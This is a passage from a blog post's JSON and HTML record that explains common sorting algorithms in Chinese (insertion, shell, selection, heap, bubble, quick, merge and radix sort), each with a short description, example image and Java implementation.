i=(lastIndex-1)/2;i>=0;i--){  \n            //k保存正在判断的节点  \n            int k=i;  \n            //如果当前k节点的子节点存在  \n            while(k*2+1<=lastIndex){  \n                //k节点的左子节点的索引  \n                int biggerIndex=2*k+1;  \n                //如果biggerIndex小于lastIndex，即biggerIndex+1代表的k节点的右子节点存在  \n                if(biggerIndex<lastIndex){  \n                    //若果右子节点的值较大  \n                    if(data[biggerIndex]<data[biggerIndex+1]){  \n                        //biggerIndex总是记录较大子节点的索引  \n                        biggerIndex++;  \n                    }  \n                }  \n                //如果k节点的值小于其较大的子节点的值  \n                if(data[k]<data[biggerIndex]){  \n                    //交换他们  \n                    swap(data,k,biggerIndex);  \n                    //将biggerIndex赋予k，开始while循环的下一次循环，重新保证k节点的值大于其左右子节点的值  \n                    k=biggerIndex;  \n                }else{  \n                    break;  \n                }  \n            }\n        }\n    }\n}\n```\n\n### 5、冒泡排序\n\n（1）基本思想：在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/9.png)\n（3）用java实现\n```bash\npublic class bubbleSort {  \npublic  bubbleSort(){  \n     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    int temp=0;  \n    for(int i=0;i<a.length-1;i++){  \n        for(int j=0;j<a.length-1-i;j++){  \n        if(a[j]>a[j+1]){  \n            temp=a[j];  \n            a[j]=a[j+1];  \n            a[j+1]=temp;  \n        }  \n        }  \n    }  \n    for(int i=0;i<a.length;i++)  \n    System.out.println(a[i]);     \n}  \n}\n```\n\n### 6、快速排序\n\n（1）基本思想：选择一个基准元素,通常选择第一个元素或者最后一个元素,通过一趟扫描，将待排序列分成两部分,一部分比基准元素小,一部分大于等于基准元素,此时基准元素在其排好序后的正确位置,然后再用同样的方法递归地排序划分的两部分。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/10.png)\n（3）用java实现\n```bash\npublic class quickSort {  \n  int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \npublic  quickSort(){  \n    quick(a);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic int getMiddle(int[] list, int low, int high) {     \n            int tmp = list[low];    //数组的第一个作为中轴     \n            while (low < high) {     \n                while (low < high && list[high] >= tmp) {     \n\n      high--;     \n                }     \n                list[low] = list[high];   //比中轴小的记录移到低端     \n                while (low < high && list[low] <= tmp) {     \n                    low++;     \n                }     \n                list[high] = list[low];   //比中轴大的记录移到高端     \n            }     \n           list[low] = tmp;              //中轴记录到尾     \n            return low;                   //返回中轴的位置     \n        }    \npublic void _quickSort(int[] list, int low, int high) {     \n            if (low < high) {     \n               int middle = getMiddle(list, low, high);  //将list数组进行一分为二     \n                _quickSort(list, low, middle - 1);        //对低字表进行递归排序     \n               _quickSort(list, middle + 1, high);       //对高字表进行递归排序     \n            }     \n        }   \npublic void quick(int[] a2) {     \n            if (a2.length > 0) {    //查看数组是否为空     \n                _quickSort(a2, 0, a2.length - 1);     \n        }     \n       }   \n}\n```\n\n### 7、归并排序\n\n（1）基本排序：归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/11.png)\n（3）用java实现\n```bash\nimport java.util.Arrays;  \n\npublic class mergingSort {  \nint a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \npublic  mergingSort(){  \n    sort(a,0,a.length-1);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic void sort(int[] data, int left, int right) {  \n    // TODO Auto-generated method stub  \n    if(left<right){  \n        //找出中间索引  \n        int center=(left+right)/2;  \n        //对左边数组进行递归  \n        sort(data,left,center);  \n        //对右边数组进行递归  \n        sort(data,center+1,right);  \n        //合并  \n        merge(data,left,center,right);  \n\n    }  \n}  \npublic void merge(int[] data, int left, int center, int right) {  \n    // TODO Auto-generated method stub  \n    int [] tmpArr=new int[data.length];  \n    int mid=center+1;  \n    //third记录中间数组的索引  \n    int third=left;  \n    int tmp=left;  \n    while(left<=center&&mid<=right){  \n\n   //从两个数组中取出最小的放入中间数组  \n        if(data[left]<=data[mid]){  \n            tmpArr[third++]=data[left++];  \n        }else{  \n            tmpArr[third++]=data[mid++];  \n        }  \n    }  \n    //剩余部分依次放入中间数组  \n    while(mid<=right){  \n        tmpArr[third++]=data[mid++];  \n    }  \n    while(left<=center){  \n        tmpArr[third++]=data[left++];  \n    }  \n    //将中间数组中的内容复制回原数组  \n    while(tmp<=right){  \n        data[tmp]=tmpArr[tmp++];  \n    }  \n    System.out.println(Arrays.toString(data));  \n}  \n\n}\n```\n\n### 8、基数排序\n\n（1）基本思想：将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后,数列就变成一个有序序列。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/12.png)\n（3）用java实现\n```bash\nimport java.util.ArrayList;  \nimport java.util.List;  \n\npublic class radixSort {  \n    int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51};  \npublic radixSort(){  \n    sort(a);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic  void sort(int[] array){     \n\n            //首先确定排序的趟数;     \n        int max=array[0];     \n        for(int i=1;i<array.length;i++){     \n               if(array[i]>max){     \n               max=array[i];     \n               }     \n            }     \n\n    int time=0;     \n           //判断位数;     \n            while(max>0){     \n               max/=10;     \n                time++;     \n            }     \n\n        //建立10个队列;     \n            List<ArrayList> queue=new ArrayList<ArrayList>();     \n            for(int i=0;i<10;i++){     \n                ArrayList<Integer> queue1=new ArrayList<Integer>();   \n                queue.add(queue1);     \n        }     \n\n            //进行time次分配和收集;     \n            for(int i=0;i<time;i++){     \n\n                //分配数组元素;     \n               for(int j=0;j<array.length;j++){     \n                    //得到数字的第time+1位数;   \n                   int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i);  \n                   ArrayList<Integer> queue2=queue.get(x);  \n                   queue2.add(array[j]);  \n                   queue.set(x, queue2);  \n            }     \n                int count=0;//元素计数器;     \n            //收集队列元素;     \n                for(int k=0;k<10;k++){   \n                while(queue.get(k).size()>0){  \n                    ArrayList<Integer> queue3=queue.get(k);  \n                        array[count]=queue3.get(0);     \n                        queue3.remove(0);  \n                    count++;  \n              }     \n            }     \n          }     \n\n   }    \n\n}\n```\n","slug":"Java常用算法","published":1,"updated":"2016-11-17T11:59:42.664Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulay000sgwtmlhiond2b","content":"<h3 id=\"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;\"><a href=\"#&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;\" class=\"headerlink\" title=\"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;:\"></a>&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;:</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/1.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/2.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n<h3 id=\"1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\"><a href=\"#1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\"></a>1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5047;&#x8BBE;&#x524D;&#x9762;(n-1)[n&gt;=2] &#x4E2A;&#x6570;&#x5DF2;&#x7ECF;&#x662F;&#x6392;<br>&#x597D;&#x987A;&#x5E8F;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x8981;&#x628A;&#x7B2C;n&#x4E2A;&#x6570;&#x63D2;&#x5230;&#x524D;&#x9762;&#x7684;&#x6709;&#x5E8F;&#x6570;&#x4E2D;&#xFF0C;&#x4F7F;&#x5F97;&#x8FD9;n&#x4E2A;&#x6570;<br>&#x4E5F;&#x662F;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x7684;&#x3002;&#x5982;&#x6B64;&#x53CD;&#x590D;&#x5FAA;&#x73AF;&#xFF0C;&#x76F4;&#x5230;&#x5168;&#x90E8;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/3.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> package com.njue;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class insertSort {  </span><br><span class=\"line\">public <span class=\"function\"><span class=\"title\">insertSort</span></span>(){  </span><br><span class=\"line\">    inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=1;i&lt;a.length;i++){  </span><br><span class=\"line\">       int j=i-1;  </span><br><span class=\"line\">       temp=a[i];  </span><br><span class=\"line\">       <span class=\"keyword\">for</span>(;j&gt;=0&amp;&amp;temp&lt;a[j];j--){  </span><br><span class=\"line\">       a[j+1]=a[j];                       //&#x5C06;&#x5927;&#x4E8E;temp&#x7684;&#x503C;&#x6574;&#x4F53;&#x540E;&#x79FB;&#x4E00;&#x4E2A;&#x5355;&#x4F4D;  </span><br><span class=\"line\">       }  </span><br><span class=\"line\">       a[j+1]=temp;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">       System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\"><a href=\"#2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\" class=\"headerlink\" title=\"2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\"></a>2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x7B97;&#x6CD5;&#x5148;&#x5C06;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x6309;&#x67D0;&#x4E2A;&#x589E;&#x91CF;d&#xFF08;n/2,n&#x4E3A;&#x8981;&#x6392;&#x5E8F;&#x6570;&#x7684;&#x4E2A;&#x6570;&#xFF09;&#x5206;&#x6210;&#x82E5;&#x5E72;&#x7EC4;&#xFF0C;&#x6BCF;&#x7EC4;&#x4E2D;&#x8BB0;&#x5F55;&#x7684;&#x4E0B;&#x6807;&#x76F8;&#x5DEE;d.&#x5BF9;&#x6BCF;&#x7EC4;&#x4E2D;&#x5168;&#x90E8;&#x5143;&#x7D20;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x8F83;&#x5C0F;&#x7684;&#x589E;&#x91CF;&#xFF08;d/2&#xFF09;&#x5BF9;&#x5B83;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#xFF0C;&#x5728;&#x6BCF;&#x7EC4;&#x4E2D;&#x518D;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x3002;&#x5F53;&#x589E;&#x91CF;&#x51CF;&#x5230;1&#x65F6;&#xFF0C;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x540E;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/4.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class shellSort {  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">shellSort</span></span>(){  </span><br><span class=\"line\">    int a[]={1,54,6,3,78,34,12,45,56,100};  </span><br><span class=\"line\">    double d1=a.length;  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){  </span><br><span class=\"line\">        d1= Math.ceil(d1/2);  </span><br><span class=\"line\">        int d=(int) d1;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int x=0;x&lt;d;x++){  </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=x+d;i&lt;a.length;i+=d){  </span><br><span class=\"line\">                int j=i<span class=\"_\">-d</span>;  </span><br><span class=\"line\">                temp=a[i];  </span><br><span class=\"line\">                <span class=\"keyword\">for</span>(;j&gt;=0&amp;&amp;temp&lt;a[j];j-=d){  </span><br><span class=\"line\">                a[j+d]=a[j];  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">                a[j+d]=temp;  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(d==1)  </span><br><span class=\"line\">            <span class=\"built_in\">break</span>;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\"><a href=\"#3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\"></a>3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x9009;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x4E0E;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF1B;<br>&#x7136;&#x540E;&#x5728;&#x5269;&#x4E0B;&#x7684;&#x6570;&#x5F53;&#x4E2D;&#x518D;&#x627E;&#x6700;&#x5C0F;&#x7684;&#x4E0E;&#x7B2C;&#x4E8C;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF0C;&#x5982;&#x6B64;&#x5FAA;&#x73AF;&#x5230;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6570;&#x6BD4;&#x8F83;&#x4E3A;&#x6B62;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/5.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class selectSort {  </span><br><span class=\"line\">    public <span class=\"function\"><span class=\"title\">selectSort</span></span>(){  </span><br><span class=\"line\">        int a[]={1,54,6,3,78,34,12,45};  </span><br><span class=\"line\">        int position=0;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++){  </span><br><span class=\"line\"></span><br><span class=\"line\">            int j=i+1;  </span><br><span class=\"line\">            position=i;  </span><br><span class=\"line\">            int temp=a[i];  </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(;j&lt;a.length;j++){  </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&lt;temp){  </span><br><span class=\"line\">                temp=a[j];  </span><br><span class=\"line\">                position=j;  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">            a[position]=a[i];  </span><br><span class=\"line\">            a[i]=temp;  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">            System.out.println(a[i]);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"4&#x3001;&#x5806;&#x6392;&#x5E8F;\"><a href=\"#4&#x3001;&#x5806;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"4&#x3001;&#x5806;&#x6392;&#x5E8F;\"></a>4&#x3001;&#x5806;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5806;&#x6392;&#x5E8F;&#x662F;&#x4E00;&#x79CD;&#x6811;&#x5F62;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#xFF0C;&#x662F;&#x5BF9;&#x76F4;&#x63A5;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#x7684;&#x6709;&#x6548;&#x6539;&#x8FDB;&#x3002;<br>&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;&#x5177;&#x6709;n&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5E8F;&#x5217;&#xFF08;h1,h2,&#x2026;,hn),&#x5F53;&#x4E14;&#x4EC5;&#x5F53;&#x6EE1;&#x8DB3;&#xFF08;hi&gt;=h2i,hi&gt;=2i+1&#xFF09;&#x6216;&#xFF08;hi&lt;=h2i,hi&lt;=2i+1&#xFF09; (i=1,2,&#x2026;,n/2)&#x65F6;&#x79F0;&#x4E4B;&#x4E3A;&#x5806;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x53EA;&#x8BA8;&#x8BBA;&#x6EE1;&#x8DB3;&#x524D;&#x8005;&#x6761;&#x4EF6;&#x7684;&#x5806;&#x3002;&#x7531;&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5806;&#x9876;&#x5143;&#x7D20;&#xFF08;&#x5373;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF09;&#x5FC5;&#x4E3A;&#x6700;&#x5927;&#x9879;&#xFF08;&#x5927;&#x9876;&#x5806;&#xFF09;&#x3002;&#x5B8C;&#x5168;&#x4E8C;&#x53C9;&#x6811;&#x53EF;&#x4EE5;&#x5F88;&#x76F4;&#x89C2;&#x5730;&#x8868;&#x793A;&#x5806;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x5806;&#x9876;&#x4E3A;&#x6839;&#xFF0C;&#x5176;&#x5B83;&#x4E3A;&#x5DE6;&#x5B50;&#x6811;&#x3001;&#x53F3;&#x5B50;&#x6811;&#x3002;&#x521D;&#x59CB;&#x65F6;&#x628A;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x6570;&#x7684;&#x5E8F;&#x5217;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x68F5;&#x987A;&#x5E8F;&#x5B58;&#x50A8;&#x7684;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x8C03;&#x6574;&#x5B83;&#x4EEC;&#x7684;&#x5B58;&#x50A8;&#x5E8F;&#xFF0C;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5806;&#xFF0C;&#x8FD9;&#x65F6;&#x5806;&#x7684;&#x6839;&#x8282;&#x70B9;&#x7684;&#x6570;&#x6700;&#x5927;&#x3002;&#x7136;&#x540E;&#x5C06;&#x6839;&#x8282;&#x70B9;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x4EA4;&#x6362;&#x3002;&#x7136;&#x540E;&#x5BF9;&#x524D;&#x9762;(n-1)&#x4E2A;&#x6570;&#x91CD;&#x65B0;&#x8C03;&#x6574;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x5806;&#x3002;&#x4F9D;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;&#x76F4;&#x5230;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x5806;&#xFF0C;&#x5E76;&#x5BF9;&#x5B83;&#x4EEC;&#x4F5C;&#x4EA4;&#x6362;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x6709;n&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;&#x4ECE;&#x7B97;&#x6CD5;&#x63CF;&#x8FF0;&#x6765;&#x770B;&#xFF0C;&#x5806;&#x6392;&#x5E8F;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E00;&#x662F;&#x5EFA;&#x7ACB;&#x5806;&#xFF0C;&#x4E8C;&#x662F;&#x5806;&#x9876;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4EA4;&#x6362;&#x4F4D;&#x7F6E;&#x3002;&#x6240;&#x4EE5;&#x5806;&#x6392;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7EC4;&#x6210;&#x3002;&#x4E00;&#x662F;&#x5EFA;&#x5806;&#x7684;&#x6E17;&#x900F;&#x51FD;&#x6570;&#xFF0C;&#x4E8C;&#x662F;&#x53CD;&#x590D;&#x8C03;&#x7528;&#x6E17;&#x900F;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x6392;&#x5E8F;&#x7684;&#x51FD;&#x6570;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br>&#x521D;&#x59CB;&#x5E8F;&#x5217;&#xFF1A;46,79,56,38,40,84<br>&#x5EFA;&#x5806;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/6.png\" alt=\"\"><br>&#x4EA4;&#x6362;&#xFF0C;&#x4ECE;&#x5806;&#x4E2D;&#x8E22;&#x51FA;&#x6700;&#x5927;&#x6570;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/7.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/8.png\" alt=\"\"><br>&#x4F9D;&#x6B21;&#x7C7B;&#x63A8;&#xFF1A;&#x6700;&#x540E;&#x5806;&#x4E2D;&#x5269;&#x4F59;&#x7684;&#x6700;&#x540E;&#x4E24;&#x4E2A;&#x7ED3;&#x70B9;&#x4EA4;&#x6362;&#xFF0C;&#x8E22;&#x51FA;&#x4E00;&#x4E2A;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;<br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.Arrays;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class HeapSort {  </span><br><span class=\"line\">     int 